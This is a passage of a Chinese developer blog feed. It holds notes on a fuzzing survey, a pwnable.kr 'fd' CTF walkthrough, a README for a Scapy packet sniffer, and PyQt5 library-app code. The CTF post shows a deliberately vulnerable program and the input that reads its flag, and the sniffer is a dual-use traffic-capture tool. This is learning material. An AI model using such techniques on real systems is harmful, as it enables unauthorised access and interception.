schedul</p></li></ul></li><li><p>AFLGo进一步优化了优先级策略</p></li></ul><h2><span id="pinput-generation">INPUT GENERATION</span><a href="#pinput-generation" class="header-anchor">#</a></h2><p>有的fuzzer通过在原有seed上突变来产生下一次的输入，而有的基于model产生下一次的输入</p><h3><span id="pmodel-based-generation-based-fuzzers">Model-based (Generation-based) Fuzzers</span><a href="#pmodel-based-generation-based-fuzzers" class="header-anchor">#</a></h3><ul><li><p>predefined model 预定义模型：1.在使用前由user定义模型；2. 模型由fuzzer通过预定义的语法等来自动构建</p></li><li><p>Inferred Model 推断模型：发生在PREPROCESS和CONFUPDATE阶段，通过数据驱动、状态机等实现推断</p></li><li><p>Encoder Model：常用于有固定格式的文件的fuzzer</p></li></ul><h3><span id="pmodel-less-mutation-based-fuzzers">Model-Less （Mutation-based）Fuzzers</span><a href="#pmodel-less-mutation-based-fuzzers" class="header-anchor">#</a></h3><p>这个很常见</p><ul><li>比特位翻转</li><li>算数变异</li><li>基于块的变异</li><li>基于字典的变异</li></ul><h3><span id="pwhite-box-fuzzers">White-box Fuzzers</span><a href="#pwhite-box-fuzzers" class="header-anchor">#</a></h3><ul><li>动态符号执行</li><li>启发式fuzzing</li><li>输入变异</li></ul><h2><span id="pinput-evaluation">INPUT EVALUATION</span><a href="#pinput-evaluation" class="header-anchor">#</a></h2><p>是对输入进行执行以及分析的过程</p><h3><span id="pbug-oracles">Bug Oracles</span><a href="#pbug-oracles" class="header-anchor">#</a></h3><p>用于判断是否有crash 或者有bug的policy，分类举例如下</p><ul><li><p>Memory and Type Safety：Address Sanitizer、SoftBounf/CETS、CFI</p></li><li><p>Undefined Behaviors：Memory Sanitizer 、Undefined Behavior Sanitizer、Thread Sanitizer</p></li><li><p>Input Validation：KameleonFuzz、μ4SQLi</p></li><li><p>Semantic Difference：black-box differential fuzz</p></li></ul><h3><span id="pexecution-optimizations">Execution Optimizations</span><a href="#pexecution-optimizations" class="header-anchor">#</a></h3><p>由于需要频繁运行程序，所以需要进行执行优化。例如函数级别的fuzz、通过fork已有的进程来免去加载时间等等</p><h3><span id="ptriage">Triage</span><a href="#ptriage" class="header-anchor">#</a></h3><p>分类是分析和报告导致违反策略的测试用例的过程。分类可以分为三个步骤：重复数据消除、优先级划分和测试用例最小化。</p><ul><li>重复数据消除方法：Stack Backtrace Hashing、Coverage-based Deduplication、Semantics-aware Deduplication</li><li>Prioritization and Exploitability：著名的有WinDbg的自动检测能够被利用!expoitable</li><li>Test case minimization：例如BFF、AFL等fuzzer使用的策略</li></ul><h2><span id="pconfiguration-updating">CONFIGURATION UPDATING</span><a href="#pconfiguration-updating" class="header-anchor">#</a></h2><p>黑盒、白盒、灰盒fuzzing在这一个步骤上区别很大</p><ul><li>Evolutionary Algorithm：维护seed pool，使其尽可能到达更多的路径</li><li>Maintaining a Minset：最小化测试用例集合，最大化覆盖率</li></ul><h2><span id="pge-ren-gan-jue">个人感觉</span><a href="#pge-ren-gan-jue" class="header-anchor">#</a></h2><p>整体上写了很多，并且分类也十分细致，抽取出了一个fuzzer的框架，但东西太多，点到为止。</p><p>看完其他的fuzzing paper再回来看这篇论文收获会更大。</p>]]></content>
      <categories>
        <category>papers</category>
        <category>security</category>
        <category>fuzz</category>
      </categories>
      <tags>
        <tag>paper</tag>
        <tag>security</tag>
        <tag>fuzz</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr —— fd</title>
    <url>/98f1adad.html</url>
    <content><![CDATA[<h2><span id="pquestion">question</span><a href="#pquestion" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Mommy! what is a file descriptor in Linux?</span><br><span class="line"></span><br><span class="line">* try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial link:</span><br><span class="line">https:&#x2F;&#x2F;youtu.be&#x2F;971eZhMHQQw</span><br><span class="line"></span><br><span class="line">ssh fd@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure><p>题目要求我们使用ssh登录到服务器上查看<code>ssh fd@pwnable.kr -p2222</code>，密码是<code>guest</code>,有的时候可能有身份的校验，这个时候需要加上参数<code>-o StrictHostKeyChecking=no</code>进行登录</p><a id="more"></a><h3><span id="pfd-c">fd.c</span><a href="#pfd-c" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">char buf[32];</span><br><span class="line">int main(int argc, char* argv[], char* envp[])&#123;</span><br><span class="line">	if(argc&lt;2)&#123;</span><br><span class="line">		printf(&quot;pass argv[1] a number\n&quot;);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line">	int fd &#x3D; atoi( argv[1] ) - 0x1234;</span><br><span class="line">	int len &#x3D; 0;</span><br><span class="line">	len &#x3D; read(fd, buf, 32);</span><br><span class="line">	if(!strcmp(&quot;LETMEWIN\n&quot;, buf))&#123;</span><br><span class="line">		printf(&quot;good job :)\n&quot;);</span><br><span class="line">		system(&quot;&#x2F;bin&#x2F;cat flag&quot;);</span><br><span class="line">		exit(0);</span><br><span class="line">	&#125;</span><br><span class="line">	printf(&quot;learn about Linux file IO\n&quot;);</span><br><span class="line">	return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="panalyse">analyse</span><a href="#panalyse" class="header-anchor">#</a></h2><p>当运行可执行程序<code>fd</code>后，会计算变量<code>fd</code>的值，然后作为<code>read</code>函数的参数对<code>read</code>函数进行调用<br><code>read</code>函数：</p><ul><li><code>fd</code>为0 ：标准输入</li><li><code>fd</code>为1 ：标准输出</li><li><code>fd</code>为2 ：标准错误输出</li></ul><p>所以在这里我们需要是<code>fd</code>为0，然后输入字符串<code>LETMEWIN</code>给<code>buf</code>，这样判断<code>strcmp(&quot;LETMEWIN\n&quot;, buf)</code>的结果为0，从而运行<code>system</code>函数可以查看到<code>flag</code></p><p>所以<code>atoi(argv[1])</code>的值应该等于<code>0x1234</code>,其十进制值为4660</p><h2><span id="pget-flag">get flag</span><a href="#pget-flag" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fd@ubuntu:~$ .&#x2F;fd 4660</span><br><span class="line">LETMEWIN</span><br><span class="line">good job :)</span><br><span class="line">mommy! I think I know what a file descriptor is!!</span><br></pre></td></tr></table></figure><p><code>flag</code>:<code>mommy! I think I know what a file descriptor is!!</code></p>]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
        <category>pwnable.kr</category>
        <category>Toddler&#39;sBottle</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
        <tag>Toddler&#39;s Bottle</tag>
      </tags>
  </entry>
  <entry>
    <title>PyQt5+Scapy实现网络嗅探器CloudSniffer</title>
    <url>/e6624f61.html</url>
    <content><![CDATA[<h1><span id="cloudsniffer">CloudSniffer</span><a href="#cloudsniffer" class="header-anchor">#</a></h1><blockquote><p>课程实验，使用Scapy和PyQt5 实现了 一款Mac上的网络嗅探工具</p></blockquote><p><a href="https://github.com/ycdxsb/CloudSniffer" target="_blank" rel="noopener">CloudSniffer的Github链接</a></p><a id="more"></a><h4><span id="pgong-neng">功能</span><a href="#pgong-neng" class="header-anchor">#</a></h4><p><strong>基本功能</strong>：</p><ul><li>网卡选择</li><li>开始、停止抓包</li><li>清除数据</li><li>保存数据</li><li>读取数据</li><li>退出程序</li><li>流量包基本信息显示</li><li>协议分析</li><li>hexdump内容</li></ul><p><strong>统计功能</strong></p><ul><li><p>流量协议统计（帧数、字节数）</p></li><li><p>流入流量统计（帧数、字节数）</p></li><li><p>流出流量统计（帧数、字节数）</p></li><li><p>流量时间统计（字节数）</p></li><li><p>IP所在地查询</p></li></ul><p><strong>其他功能</strong></p><ul><li>嗅探前过滤、嗅探后过滤</li><li>html内容提取</li><li>日志记录</li></ul><h4><span id="pxiao-guo-zhan-shi">效果展示</span><a href="#pxiao-guo-zhan-shi" class="header-anchor">#</a></h4><p><strong>基本界面</strong></p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdd61b42pej30zq0u0kak.jpg" alt="basic"></p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdd61tgcwzg30m80i67ws.gif" alt="basic"></p><p><strong>统计功能</strong></p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdd628yoh9j31cy0u0b29.jpg" alt="statistics"></p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdd62v3bvxg30m80i8x6v.gif" alt="statistics"></p><p><strong>提取html内容</strong></p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdd633t246j31oz0u0kjl.jpg" alt="extractHTML"></p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdd63vvu4ug30m80i3hdz.gif" alt="extractHTML"></p><h4><span id="pan-zhuang-shi-yong">安装使用</span><a href="#pan-zhuang-shi-yong" class="header-anchor">#</a></h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">clone</span> https://github.com/ycdxsb/CloudSniffer.git</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> ./CloudSniffer</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> pip3 install requirements.txt</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> python3 CloudSniffer.py</span></span><br></pre></td></tr></table></figure><h4><span id="pcan-kao">参考</span><a href="#pcan-kao" class="header-anchor">#</a></h4><ul><li><a href="https://github.com/invernizzi/scapy-http" target="_blank" rel="noopener">scapy-http</a></li><li><a href="https://github.com/HatBoy/Pcap-Analyzer" target="_blank" rel="noopener">Pcap-Analyser</a></li></ul>]]></content>
      <categories>
        <category>PyQt5</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>PyQt5</tag>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>PyQt5搭建图书馆管理系统（11）——窗口信号与槽以及主窗口循环(项目完)</title>
    <url>/9f815f0d.html</url>
    <content><![CDATA[<h2><span id="pguan-li-yuan-zhu-ye-xin-hao-yu-cao">管理员主页信号与槽</span><a href="#pguan-li-yuan-zhu-ye-xin-hao-yu-cao" class="header-anchor">#</a></h2><h3><span id="pchuang-kou-nei-xin-hao-yu-cao">窗口内信号与槽</span><a href="#pchuang-kou-nei-xin-hao-yu-cao" class="header-anchor">#</a></h3><p>在管理员主页代码的<code>setUpUI</code>中，可以看到如下代码</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">self.addBookButton.clicked.connect(self.addBookButtonClicked)</span><br><span class="line">        self.dropBookButton.clicked.connect(self.dropBookButtonClicked)</span><br><span class="line">        self.userManageButton.clicked.connect(self.userManage)</span><br></pre></td></tr></table></figure><p>这是Qt自带的信号与槽机制，也就是<code>QPushButton</code>点击触发，分别是</p><ul><li>添加书籍按钮点击触发弹出添加书籍对话框</li><li>淘汰书籍按钮点击触发弹出淘汰书籍对话框</li><li>用户管理按钮点击弹出用户管理对话框</li></ul><a id="more"></a><h3><span id="pchuang-kou-jian-xin-hao-yu-cao">窗口间信号与槽</span><a href="#pchuang-kou-jian-xin-hao-yu-cao" class="header-anchor">#</a></h3><p>在管理员主页代码中的<code>addBookButtonClicked</code>和<code>dropBookButtonClicked</code>函数中，可以看到这样两行代码</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">addDialog.add_book_success_signal.connect(self.storageView.searchButtonClicked)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dropDialog.drop_book_successful_signal.connect(self.storageView.searchButtonClicked)</span><br></pre></td></tr></table></figure><p>同样的，我们找一下发送信号方的信号定义<br>在<code>borrowBookDialog</code>中有<code>borrow_book_success_signal = pyqtSignal()</code><br>同时可以在<code>borrowButtonClicked</code>函数中看到，当成功添加书籍时会发送信号<br>而我们在管理员主页中，将这个信号与库存查询组件的的<code>searchButtonClicked</code>连接，也就是实现了当书籍添加时，动态刷新库存。<br>UI交互良好</p><p>另一个也是一样，就不赘述了</p><h2><span id="pxue-sheng-yong-hu-zhu-ye-xin-hao-yu-cao">学生用户主页信号与槽</span><a href="#pxue-sheng-yong-hu-zhu-ye-xin-hao-yu-cao" class="header-anchor">#</a></h2><h3><span id="pchuang-kou-nei-xin-hao-yu-cao">窗口内信号与槽</span><a href="#pchuang-kou-nei-xin-hao-yu-cao" class="header-anchor">#</a></h3><p>与管理员主页一样，可以找到</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">self.borrowBookButton.clicked.connect(self.borrowBookButtonClicked)</span><br><span class="line">       self.returnBookButton.clicked.connect(self.returnBookButtonClicked)</span><br><span class="line">       self.myBookStatus.clicked.connect(self.myBookStatusClicked)</span><br><span class="line">       self.allBookButton.clicked.connect(self.allBookButtonClicked)</span><br></pre></td></tr></table></figure><h3><span id="pchuang-kou-jian-xin-hao-yu-cao">窗口间信号与槽</span><a href="#pchuang-kou-jian-xin-hao-yu-cao" class="header-anchor">#</a></h3><p>在<code>borrowBookButtonClicked</code>函数可以找到</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">borrowDialog.borrow_book_success_signal.connect(self.borrowStatusView.borrowedQuery)</span><br><span class="line">        borrowDialog.borrow_book_success_signal.connect(self.storageView.searchButtonClicked)</span><br></pre></td></tr></table></figure><p>这里既要刷新库存显示，同时也要刷新借书状态显示</p><p>在<code>returnBookButtonClicked</code>函数可以找到</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">returnDialog.return_book_success_signal.connect(self.borrowStatusView.returnedQuery)</span><br><span class="line">       returnDialog.return_book_success_signal.connect(self.borrowStatusView.borrowedQuery)</span><br><span class="line">       returnDialog.return_book_success_signal.connect(self.storageView.searchButtonClicked)</span><br></pre></td></tr></table></figure><p>效果也是一样</p><h2><span id="pzhu-chuang-kou-xun-huan">主窗口循环</span><a href="#pzhu-chuang-kou-xun-huan" class="header-anchor">#</a></h2><p>在菜单栏中，有注册、修改密码、登录账户、退出登录、退出可以点击<br>当然其能否点击需要根据当前窗口决定，比如如果已登录，当然就不能点击登录和修改密码了<br>至于窗口的<code>setCentralWidget</code>调用，比如输入密码，是切换到用户主页还是到管理员主页，当然是看发射的信号是什么啦</p><h3><span id="pshi-xian-dai-ma">实现代码</span><a href="#pshi-xian-dai-ma" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">from PyQt5.QtWidgets import *</span><br><span class="line">from PyQt5.QtGui import QIcon, QFont</span><br><span class="line">from PyQt5.QtCore import *</span><br><span class="line">import qdarkstyle</span><br><span class="line">from SignIn import SignInWidget</span><br><span class="line">from SignUp import SignUpWidget</span><br><span class="line">import sip</span><br><span class="line">from AdminHome import AdminHome</span><br><span class="line">from StudentHome import StudentHome</span><br><span class="line">from changePasswordDialog import changePasswordDialog</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Main(QMainWindow):</span><br><span class="line">    def __init__(self, parent&#x3D;None):</span><br><span class="line">        super(Main, self).__init__(parent)</span><br><span class="line">        self.layout &#x3D; QHBoxLayout()</span><br><span class="line">        self.widget &#x3D; SignInWidget()</span><br><span class="line">        self.resize(900, 600)</span><br><span class="line">        self.setWindowTitle(&quot;欢迎登陆图书馆管理系统&quot;)</span><br><span class="line">        self.setCentralWidget(self.widget)</span><br><span class="line">        bar &#x3D; self.menuBar()</span><br><span class="line">        self.Menu &#x3D; bar.addMenu(&quot;菜单栏&quot;)</span><br><span class="line">        self.signUpAction &#x3D; QAction(&quot;注册&quot;, self)</span><br><span class="line">        self.changePasswordAction &#x3D;QAction(&quot;修改密码&quot;,self)</span><br><span class="line">        self.signInAction &#x3D; QAction(&quot;登录&quot;, self)</span><br><span class="line">        self.quitSignInAction &#x3D; QAction(&quot;退出登录&quot;, self)</span><br><span class="line">        self.quitAction &#x3D; QAction(&quot;退出&quot;, self)</span><br><span class="line">        self.Menu.addAction(self.signUpAction)</span><br><span class="line">        self.Menu.addAction(self.changePasswordAction)</span><br><span class="line">        self.Menu.addAction(self.signInAction)</span><br><span class="line">        self.Menu.addAction(self.quitSignInAction)</span><br><span class="line">        self.Menu.addAction(self.quitAction)</span><br><span class="line">        self.signUpAction.setEnabled(True)</span><br><span class="line">        self.changePasswordAction.setEnabled(True)</span><br><span class="line">        self.signInAction.setEnabled(False)</span><br><span class="line">        self.quitSignInAction.setEnabled(False)</span><br><span class="line">        self.widget.is_admin_signal.connect(self.adminSignIn)</span><br><span class="line">        self.widget.is_student_signal[str].connect(self.studentSignIn)</span><br><span class="line">        self.Menu.triggered[QAction].connect(self.menuTriggered)</span><br><span class="line"></span><br><span class="line">    def adminSignIn(self):</span><br><span class="line">        sip.delete(self.widget)</span><br><span class="line">        self.widget &#x3D; AdminHome()</span><br><span class="line">        self.setCentralWidget(self.widget)</span><br><span class="line">        self.changePasswordAction.setEnabled(False)</span><br><span class="line">        self.signUpAction.setEnabled(True)</span><br><span class="line">        self.signInAction.setEnabled(False)</span><br><span class="line">        self.quitSignInAction.setEnabled(True)</span><br><span class="line"></span><br><span class="line">    def studentSignIn(self, studentId):</span><br><span class="line">        sip.delete(self.widget)</span><br><span class="line">        self.widget &#x3D; StudentHome(studentId)</span><br><span class="line">        self.setCentralWidget(self.widget)</span><br><span class="line">        self.changePasswordAction.setEnabled(False)</span><br><span class="line">        self.signUpAction.setEnabled(True)</span><br><span class="line">        self.signInAction.setEnabled(False)</span><br><span class="line">        self.quitSignInAction.setEnabled(True)</span><br><span class="line"></span><br><span class="line">    def menuTriggered(self, q):</span><br><span class="line">        if(q.text()&#x3D;&#x3D;&quot;修改密码&quot;):</span><br><span class="line">            changePsdDialog&#x3D;changePasswordDialog(self)</span><br><span class="line">            changePsdDialog.show()</span><br><span class="line">            changePsdDialog.exec_()</span><br><span class="line">        if (q.text() &#x3D;&#x3D; &quot;注册&quot;):</span><br><span class="line">            sip.delete(self.widget)</span><br><span class="line">            self.widget &#x3D; SignUpWidget()</span><br><span class="line">            self.setCentralWidget(self.widget)</span><br><span class="line">            self.widget.student_signup_signal[str].connect(self.studentSignIn)</span><br><span class="line">            self.signUpAction.setEnabled(False)</span><br><span class="line">            self.changePasswordAction.setEnabled(True)</span><br><span class="line">            self.signInAction.setEnabled(True)</span><br><span class="line">            self.quitSignInAction.setEnabled(False)</span><br><span class="line">        if (q.text() &#x3D;&#x3D; &quot;退出登录&quot;):</span><br><span class="line">            sip.delete(self.widget)</span><br><span class="line">            self.widget &#x3D; SignInWidget()</span><br><span class="line">            self.setCentralWidget(self.widget)</span><br><span class="line">            self.widget.is_admin_signal.connect(self.adminSignIn)</span><br><span class="line">            self.widget.is_student_signal[str].connect(self.studentSignIn)</span><br><span class="line">            self.signUpAction.setEnabled(True)</span><br><span class="line">            self.changePasswordAction.setEnabled(True)</span><br><span class="line">            self.signInAction.setEnabled(False)</span><br><span class="line">            self.quitSignInAction.setEnabled(False)</span><br><span class="line">        if (q.text() &#x3D;&#x3D; &quot;登录&quot;):</span><br><span class="line">            sip.delete(self.widget)</span><br><span class="line">            self.widget &#x3D; SignInWidget()</span><br><span class="line">            self.setCentralWidget(self.widget)</span><br><span class="line">            self.widget.is_admin_signal.connect(self.adminSignIn)</span><br><span class="line">            self.widget.is_student_signal[str].connect(self.studentSignIn)</span><br><span class="line">            self.signUpAction.setEnabled(True)</span><br><span class="line">            self.changePasswordAction.setEnabled(True)</span><br><span class="line">            self.signInAction.setEnabled(False)</span><br><span class="line">            self.quitSignInAction.setEnabled(False)</span><br><span class="line">        if (q.text() &#x3D;&#x3D; &quot;退出&quot;):</span><br><span class="line">            qApp &#x3D; QApplication.instance()</span><br><span class="line">            qApp.quit()</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    app &#x3D; QApplication(sys.argv)</span><br><span class="line">    app.setWindowIcon(QIcon(&quot;.&#x2F;images&#x2F;MainWindow_1.png&quot;))</span><br><span class="line">    app.setStyleSheet(qdarkstyle.load_stylesheet_pyqt5())</span><br><span class="line">    mainMindow &#x3D; Main()</span><br><span class="line">    mainMindow.show()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure><h3><span id="pshi-xian-xiao-guo">实现效果</span><a href="#pshi-xian-xiao-guo" class="header-anchor">#</a></h3><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdb9kfmjqjj30p40hr74n.jpg" alt="这里写图片描述"><br><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdb9kegp9cj30p60hht97.jpg" alt="这里写图片描述"><br><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdb9kf9sjmj30p90hmab8.jpg" alt="这里写图片描述"></p><h2><span id="pfu-shang-lian-jie">附上链接</span><a href="#pfu-shang-lian-jie" class="header-anchor">#</a></h2><p>项目地址：<a href="https://github.com/ycdxsb/LibraryManageDesktopApp" target="_blank" rel="noopener">github仓库链接</a></p><h2><span id="pyi-xie-gan-xiang">一些感想</span><a href="#pyi-xie-gan-xiang" class="header-anchor">#</a></h2><blockquote><p>这个项目写了大概四天的样子，同时也是第一次使用Qt，很多机制其实自己都不太熟悉，像主窗口的切换，都处理的很潦草，移出控件都强行使用<code>sip.delete</code>删除。</p><p>Qt东西很多，但使用的时候去查阅一下就好了，前几天的大作业评比，感觉自己做的还是不够好，主要是功能不够全面。</p><p>一开始想先写完再说，到时候重构就是了，但最后又没有心思重构 。</p><p>希望下次做项目的时候，自己可以想好了再出发</p></blockquote>]]></content>
      <categories>
        <category>PyQt5</category>
        <category>图书馆管理系统</category>
      </categories>
      <tags>
        <tag>PyQt5</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>PyQt5搭建图书馆管理系统（10）—— 学生主页以及修改代码</title>
    <url>/77aca64.html</url>
    <content><![CDATA[<h2><span id="pxue-sheng-zhu-ye-she-ji">学生主页设计</span><a href="#pxue-sheng-zhu-ye-she-ji" class="header-anchor">#</a></h2><h3><span id="pfen-xi">分析</span><a href="#pfen-xi" class="header-anchor">#</a></h3><p>在学生主页，主要实现以下功能：<br>1、借阅书籍<br>2、归还书籍<br>3、借阅状态查询<br>4、书籍库存查询<br>使用四个<code>QPushButton</code>，分别用于弹出借阅书籍对话框、归还书籍对话框 、切换到借阅状态查询、切换到书籍库存查询</p><a id="more"></a><h3><span id="pshi-xian-dai-ma">实现代码</span><a href="#pshi-xian-dai-ma" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">from PyQt5.QtWidgets import *</span><br><span class="line">from PyQt5.QtGui import QIcon, QFont</span><br><span class="line">from PyQt5.QtCore import Qt</span><br><span class="line">import sip</span><br><span class="line">import qdarkstyle</span><br><span class="line">from BookStorageViewer import BookStorageViewer</span><br><span class="line">from borrowBookDialog import borrowBookDialog</span><br><span class="line">from returnBookDialog import returnBookDialog</span><br><span class="line">from BorrowStatusViewer import BorrowStatusViewer</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class StudentHome(QWidget):</span><br><span class="line">    def __init__(self, studentId):</span><br><span class="line">        super().__init__()</span><br><span class="line">        self.StudentId &#x3D; studentId</span><br><span class="line">        self.resize(900, 600)</span><br><span class="line">        self.setWindowTitle(&quot;欢迎使用图书馆管理系统&quot;)</span><br><span class="line">        self.setUpUI()</span><br><span class="line"></span><br><span class="line">    def setUpUI(self):</span><br><span class="line">        # 总布局</span><br><span class="line">        self.layout &#x3D; QHBoxLayout(self)</span><br><span class="line">        # 按钮布局</span><br><span class="line">        self.buttonLayout &#x3D; QVBoxLayout()</span><br><span class="line">        # 按钮</span><br><span class="line">        self.borrowBookButton &#x3D; QPushButton(&quot;借书&quot;)</span><br><span class="line">        self.returnBookButton &#x3D; QPushButton(&quot;还书&quot;)</span><br><span class="line">        self.myBookStatus &#x3D; QPushButton(&quot;借阅状态&quot;)</span><br><span class="line">        self.allBookButton &#x3D; QPushButton(&quot;所有书籍&quot;)</span><br><span class="line">        self.buttonLayout.addWidget(self.borrowBookButton)</span><br><span class="line">        self.buttonLayout.addWidget(self.returnBookButton)</span><br><span class="line">        self.buttonLayout.addWidget(self.myBookStatus)</span><br><span class="line">        self.buttonLayout.addWidget(self.allBookButton)</span><br><span class="line">        self.borrowBookButton.setFixedWidth(100)</span><br><span class="line">        self.borrowBookButton.setFixedHeight(42)</span><br><span class="line">        self.returnBookButton.setFixedWidth(100)</span><br><span class="line">        self.returnBookButton.setFixedHeight(42)</span><br><span class="line">        self.myBookStatus.setFixedWidth(100)</span><br><span class="line">        self.myBookStatus.setFixedHeight(42)</span><br><span class="line">        self.allBookButton.setFixedWidth(100)</span><br><span class="line">        self.allBookButton.setFixedHeight(42)</span><br><span class="line">        font &#x3D; QFont()</span><br><span class="line">        font.setPixelSize(16)</span><br><span class="line">        self.borrowBookButton.setFont(font)</span><br><span class="line">        self.returnBookButton.setFont(font)</span><br><span class="line">        self.myBookStatus.setFont(font)</span><br><span class="line">        self.allBookButton.setFont(font)</span><br><span class="line"></span><br><span class="line">        self.storageView &#x3D; BookStorageViewer()</span><br><span class="line">        self.borrowStatusView&#x3D;BorrowStatusViewer(self.StudentId)</span><br><span class="line">        self.allBookButton.setEnabled(False)</span><br><span class="line"></span><br><span class="line">        self.layout.addLayout(self.buttonLayout)</span><br><span class="line">        self.layout.addWidget(self.storageView)</span><br><span class="line">        self.borrowBookButton.clicked.connect(self.borrowBookButtonClicked)</span><br><span class="line">        self.returnBookButton.clicked.connect(self.returnBookButtonClicked)</span><br><span class="line">        self.myBookStatus.clicked.connect(self.myBookStatusClicked)</span><br><span class="line">        self.allBookButton.clicked.connect(self.allBookButtonClicked)</span><br><span class="line"></span><br><span class="line">    def borrowBookButtonClicked(self):</span><br><span class="line">        borrowDialog &#x3D; borrowBookDialog(self.StudentId,self)</span><br><span class="line">        borrowDialog.borrow_book_success_signal.connect(self.borrowStatusView.borrowedQuery)</span><br><span class="line">        borrowDialog.borrow_book_success_signal.connect(self.storageView.searchButtonClicked)</span><br><span class="line">        borrowDialog.show()</span><br><span class="line">        borrowDialog.exec_()</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    def returnBookButtonClicked(self):</span><br><span class="line">        returnDialog &#x3D; returnBookDialog(self.StudentId,self)</span><br><span class="line">        returnDialog.return_book_success_signal.connect(self.borrowStatusView.returnedQuery)</span><br><span class="line">        returnDialog.return_book_success_signal.connect(self.borrowStatusView.borrowedQuery)</span><br><span class="line">        returnDialog.return_book_success_signal.connect(self.storageView.searchButtonClicked)</span><br><span class="line">        returnDialog.show()</span><br><span class="line">        returnDialog.exec_()</span><br><span class="line"></span><br><span class="line">    def myBookStatusClicked(self):</span><br><span class="line">        self.layout.removeWidget(self.storageView)</span><br><span class="line">        sip.delete(self.storageView)</span><br><span class="line">        self.storageView &#x3D; BookStorageViewer()</span><br><span class="line">        self.borrowStatusView &#x3D; BorrowStatusViewer(self.StudentId)</span><br><span class="line">        self.layout.addWidget(self.borrowStatusView)</span><br><span class="line">        self.allBookButton.setEnabled(True)</span><br><span class="line">        self.myBookStatus.setEnabled(False)</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    def allBookButtonClicked(self):</span><br><span class="line">        self.layout.removeWidget(self.borrowStatusView)</span><br><span class="line">        sip.delete(self.borrowStatusView)</span><br><span class="line">        self.borrowStatusView &#x3D; BorrowStatusViewer(self.StudentId)</span><br><span class="line">        self.storageView &#x3D; BookStorageViewer()</span><br><span class="line">        self.layout.addWidget(self.storageView)</span><br><span class="line">        self.allBookButton.setEnabled(False)</span><br><span class="line">        self.myBookStatus.setEnabled(True)</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    app &#x3D; QApplication(sys.argv)</span><br><span class="line">    app.setWindowIcon(QIcon(&quot;.&#x2F;images&#x2F;MainWindow_1.png&quot;))</span><br><span class="line">    app.setStyleSheet(qdarkstyle.load_stylesheet_pyqt5())</span><br><span class="line">    mainMindow &#x3D; StudentHome(&quot;PB15000135&quot;)</span><br><span class="line">    mainMindow.show()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure><h3><span id="pshi-xian-xiao-guo">实现效果</span><a href="#pshi-xian-xiao-guo" class="header-anchor">#</a></h3><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdb9he6lrej30p20hlgmp.jpg" alt="这里写图片描述"><br><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdb9hejm84j30p10hlmy8.jpg" alt="这里写图片描述"><br><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdb9hf008bj30p50hpq3m.jpg" alt="这里写图片描述"></p><h2><span id="pxiu-gai-mi-ma-gong-neng">修改密码功能</span><a href="#pxiu-gai-mi-ma-gong-neng" class="header-anchor">#</a></h2><blockquote><p>修改密码功能使用菜单栏<code>QAction</code>点击启动</p></blockquote><h3><span id="pfen-xi">分析</span><a href="#pfen-xi" class="header-anchor">#</a></h3><p>修改密码，主要需要用户输入学号， 原密码，新密码，确认密码实现<br>代码逻辑如下：</p><ul><li>确认学号与原密码对应，否则报错</li><li>输入新密码与确认密码 ，如果相同，则md5加密后放入数据库中</li><li>注意设置输入校验</li></ul><p>使用对话框实现</p><h3><span id="pdai-ma-shi-xian">代码实现</span><a href="#pdai-ma-shi-xian" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">from 